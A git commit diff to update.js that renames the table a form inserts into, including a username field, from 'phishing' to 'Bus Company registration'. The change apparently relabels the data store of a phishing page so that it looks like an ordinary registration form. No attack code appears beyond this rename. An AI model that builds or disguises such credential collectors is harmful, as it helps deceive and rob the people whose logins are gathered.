286488c754f879e4d3346d5f86abe040b3dfdf54
akkamata-dotcom <zonefuture899@gmail.com>
2026-06-30 10:58:13 +0300

    Change database table from 'phishing' to 'Bus Company registration'

--- update.js
+++ update.js
@@ -44,7 +44,7 @@ document
 
         const { data, error } =
         await client
-        .from("phishing")
+        .from("Bus Company registration")
         .insert([
             {
                 username: username,
